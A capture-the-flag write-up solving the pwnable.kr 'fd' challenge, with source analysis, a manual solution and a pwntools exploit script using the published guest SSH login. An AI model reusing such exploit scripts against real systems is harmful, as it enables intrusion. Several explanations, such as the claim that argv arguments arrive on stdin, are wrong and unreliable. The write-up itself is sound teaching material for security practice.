### Introduction
#### Hey guys , Lately I have been doing pwn challenges and I decided to share some stuff with you from time to time like I do with the other write-ups. Today we will solve fd from pwnable.kr , it's a very easy one but as always we will go in detail.
<br>
>  pwn means to compromise or control, specifically another computer (server or PC), website, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking.

### Challenge Description
```
Mommy! what is a file descriptor in Linux?
ssh fd@pwnable.kr -p2222 (pw:guest)
```
#### We have ssh login info, and some sort of a hint , before doing anything let's talk about file descriptors , because that's what the hint said.
<br>
<hr>
### File descriptors
#### File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in `c` as integers and there are 3 types of file descriptors :
#### `standard input` (`stdin`) , its integer value is `0`
#### `standard output` (`stdout`) , its integer value is `1`
#### `standard error` (`stderr`) , its integer value is `2`
#### To summarize this up , when you run a program and give it arguments through `sys.argv` for example , that's `stdin` , whatever the program gives you back as an output , that's `stdout` . If the program gave you an error , because you missed a required argument or gave it a wrong argument for example , that's `stderr`.

### Source analysis
#### After we `ssh` to the server (`ssh fd@pwnable.kr -p2222` , password : `guest`) we find 3 files 
![](/images/pwn/fd/1.png)
#### `fd` , `fd.c` and `flag`.
#### `fd` is an executable , and `fd.c` is the source of that executable
![](/images/pwn/fd/2.png)
#### And we don't have permissions to view `flag` :
![](/images/pwn/fd/3.png)
#### Let's take a look at the source : 
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
```
### Breakdown :
```
char buf[32];
```
#### This assigns a buffer of 32 chars to the variable `buf`
<br>
```
if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }

```
#### Here it starts by checking if we passed and argument or not , and if we didn't , it will print `pass argv[1] a number`
![](/images/pwn/fd/4.png)
<br>
<br>
```
int fd = atoi( argv[1] ) - 0x1234;
```
#### Then it defines a variable called `fd` , the value of that variable is `atoi( argv[1] ) - 0x1234`. `atoi()` is a function in `c` that converts a string into an integer , it stands for `Ascii to Integer` , `0x1234` is the hex of `4660` 
![](/images/pwn/fd/5.png)
#### So it subtracts 4660 from our input.
<br>
```
int len = 0;
```
#### This defines a variable called `len` and assigns a value of `0` to it
<br>
```
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

```
#### Here it's taking `fd` and also reading our input and puts it into `buf` , then there's an if statement which checks if the value of buf is `LETMEIN` , if it's then it will print `good job` and give us the flag , but if it's not it will print `learn about Linux file IO`.

### Exploitation
#### Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic.
#### Let's run the program just to test :
`./fd 1337`
![](/images/pwn/fd/6.png)
#### It prints `learn about Linux file IO` , because we didn't get `fd` right. We know that `fd` is an abbreviation for file descriptor , and there are 3 file descriptors `stdin` `stdout` `stderr` , And we can also control the value of `fd` because we know that it's subtracting 4660 from `argv[1]` and we control `argv[1]` , how are we giving the program `argv[1]` ? Through `stdin` which is represented by `0` , so if we gave the program `4660` , `fd = 4660 - 4660` , `fd = 0`. Let's try it.
![](/images/pwn/fd/7.png)
#### Now it didn't print `learn about Linux file IO` , instead of that it's reading our input --> `len = read(fd, buf, 32);`
#### We knew earlier that we have to make buf = "LETMEWIN" to execute the first `if` condition :
![](/images/pwn/fd/8.png)
#### And we got the flag : "mommy! I think I know what a file descriptor is!!"
<br>
<hr>
### Exploitation with python pwntools
#### We will use a python library called pwntools to create an exploit. Read the documentation [here](http://docs.pwntools.com/en/stable/about.html)
#### We will import the pwntools library :
`from pwn import *`
#### Then we will set up an `ssh` connection to the server :
`shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)`
#### `fd` is the username , `pwnable.kr` is the host
#### After that we will start a process to execute `./fd 4660`
`process = shell.process(executable='./fd', argv=['fd','4660'])`
#### And finally we will send `LETMEWIN` and read the output
`process.sendline('LETMEWIN')`
<br>
<br>
`print process.recv()`
<br>
### Final script :
```
#!/usr/bin/python

from pwn import *

shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)
process = shell.process(executable='./fd', argv=['fd','4660'])
process.sendline('LETMEWIN')
print process.recv()
```

#### Let's try it :
`./exploit.py`
![](/images/pwn/fd/10.png)
#### And it's working !
#### That's it , Feedback is appreciated !
